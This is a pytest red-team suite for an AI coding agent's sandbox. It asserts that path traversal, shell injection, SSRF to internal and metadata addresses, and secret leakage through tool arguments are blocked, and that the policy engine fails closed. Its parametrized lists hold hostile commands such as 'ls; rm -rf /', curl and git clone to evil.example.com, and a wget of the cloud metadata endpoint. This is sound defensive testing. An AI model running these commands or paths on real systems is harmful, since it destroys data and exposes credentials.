"""
Phase 6 — Red-team tests
========================
Adversarial suite: each test states an *attack* and asserts the security
boundary holds. These are deliberately framed as offensive cases (not unit
tests of happy paths) and use safe local fixtures only — no real external
service, network egress, filesystem escape, or shell execution occurs.

Attack classes covered:

* path traversal / workspace escape (absolute, UNC, ``..``, control chars, symlink);
* shell & operator injection (``;`` ``|`` ``&`` ``>`` ``$( )`` backticks, shells,
  inline interpreters, ``git push``) — raw model text must never reach a shell;
* network egress / SSRF (internal + metadata addresses);
* policy engine fail-closed behaviour under malformed/hostile input;
* secret exfiltration through tool arguments;
* DOM XSS via the chat/panel renderer (the renderer is JS — covered by the
  ``node --test nexora/frontend/test/markdown.test.mjs`` regression suite).

Cross-reference: approval-bypass attacks (replay, wrong-run, expired, altered
args, DENY-override) are asserted in ``tests/test_phase4_security_integration.py``.
"""
import os
from pathlib import Path

import pytest

from nexora.backend.app.core.policy import Capability, PolicyEngine
from nexora.backend.app.core.tools import (
    PathBoundaryError,
    ToolValidationError,
    _build_approved_shell_argv,
    _resolve_within_workspace,
    get_sandbox_adapter,
    redact_arguments,
)

SECRET = "nb-sk-redteam-0123456789"


# ---------------------------------------------------------------------------
# Path traversal / workspace escape
# ---------------------------------------------------------------------------

class TestPathTraversal:
    @pytest.mark.parametrize(
        "payload",
        [
            "../etc/passwd",
            "a/../../../etc/passwd",
            "..",
            "/etc/passwd",
            "\\\\server\\share\\x",
            "C:\\Windows\\System32\\cmd.exe",
            "a\x00b",
            "",
            None,
            "x" * 5000,
        ],
        ids=[
            "dotdot", "nested-dotdot", "lone-dotdot", "absolute-posix",
            "unc", "drive-absolute", "null-byte", "empty", "non-string", "too-long",
        ],
    )
    def test_traversal_payloads_fail_closed(self, tmp_path, payload):
        with pytest.raises(PathBoundaryError):
            _resolve_within_workspace(str(tmp_path), payload)

    def test_in_workspace_path_stays_inside(self, tmp_path):
        resolved = _resolve_within_workspace(str(tmp_path), "src/app.py")
        root = tmp_path.resolve()
        assert resolved.is_absolute()
        assert resolved.is_relative_to(root)

    @pytest.mark.skipif(os.name == "nt", reason="symlink creation is not always permitted on Windows")
    def test_symlink_escaping_root_is_rejected(self, tmp_path):
        workspace = tmp_path / "ws"
        outside = tmp_path / "outside"
        workspace.mkdir()
        outside.mkdir()
        (workspace / "escape").symlink_to(outside, target_is_directory=True)
        with pytest.raises(PathBoundaryError):
            _resolve_within_workspace(str(workspace), "escape/secret.txt")


# ---------------------------------------------------------------------------
# Shell & operator injection
# ---------------------------------------------------------------------------

class TestShellInjection:
    @pytest.mark.parametrize(
        "command",
        [
            "ls; rm -rf /",
            "cat a.txt | tee b.txt",
            "cat a.txt > b.txt",
            "git push origin main",
            "git push --force",
            "sh -c 'id'",
            "cmd /c dir",
            "bash -c 'whoami'",
            "python -c 'print(1)'",
            "$(whoami)",
            "echo `whoami`",
            "curl http://evil.example.com",
            "wget http://169.254.169.254/latest/meta-data/",
            "python -m http.server",
            "git clone http://evil.example.com/repo.git",
        ],
    )
    def test_injected_commands_are_rejected(self, command):
        with pytest.raises(ToolValidationError):
            _build_approved_shell_argv(command)

    def test_reviewed_command_is_tokenised_not_shell(self):
        argv = _build_approved_shell_argv("python -m pytest")
        assert argv == ["python", "-m", "pytest"]


# ---------------------------------------------------------------------------
# Network egress / SSRF
# ---------------------------------------------------------------------------

class TestNetworkEgress:
    INTERNAL_TARGETS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:6379/",
        "http://localhost:8001/admin",
        "http://10.0.0.1/",
        "http://[::1]:80/",
    ]

    def test_policy_denies_internal_targets(self):
        engine = PolicyEngine()
        for url in self.INTERNAL_TARGETS:
            decision = engine.evaluate(Capability.NETWORK_FETCH, {"url": url})
            assert decision.decision.value == "DENY", url

    def test_network_fetch_has_no_implementation(self):
        adapter = get_sandbox_adapter()
        import asyncio
        for url in self.INTERNAL_TARGETS:
            result = asyncio.run(adapter._network_fetch({"url": url}))
            assert result["exit_code"] == 1
            assert "denied" in result["stderr"].lower()


# ---------------------------------------------------------------------------
# Policy engine fail-closed behaviour
# ---------------------------------------------------------------------------

class TestPolicyFailsClosed:
    @pytest.mark.parametrize("args", [None, {}, [], "string", 123, {"path": 123}, {"remote": object()}])
    def test_malformed_arguments_yield_deny_not_exception(self, args):
        engine = PolicyEngine()
        decision = engine.evaluate(Capability.GIT_PUSH, args)
        assert decision.decision.value in {"DENY", "QUARANTINE", "REQUIRE_APPROVAL"}

    def test_deny_is_never_overridden_by_approval_state(self):
        engine = PolicyEngine()
        denied = engine.evaluate(Capability.GIT_PUSH, {"remote": "origin"})
        assert denied.decision.value == "DENY"
        # An approval state must not upgrade a DENY.
        overridden = engine.evaluate(
            Capability.GIT_PUSH, {"remote": "origin"}, approval_state="approved"
        )
        assert overridden.decision.value == "DENY"


# ---------------------------------------------------------------------------
# Secret exfiltration through tool arguments
# ---------------------------------------------------------------------------

class TestSecretRedaction:
    def test_nested_secrets_are_redacted(self):
        arguments = {
            "path": "a.py",
            "api_key": SECRET,
            "nested": {"db_password": SECRET, "authorization": f"Bearer {SECRET}"},
        }
        safe = redact_arguments(arguments)
        assert safe["api_key"] == "[REDACTED]"
        assert safe["nested"]["db_password"] == "[REDACTED]"
        assert safe["nested"]["authorization"] == "[REDACTED]"
        assert safe["path"] == "a.py"

    def test_redaction_does_not_mutate_input(self):
        arguments = {"api_key": SECRET}
        redact_arguments(arguments)
        assert arguments["api_key"] == SECRET
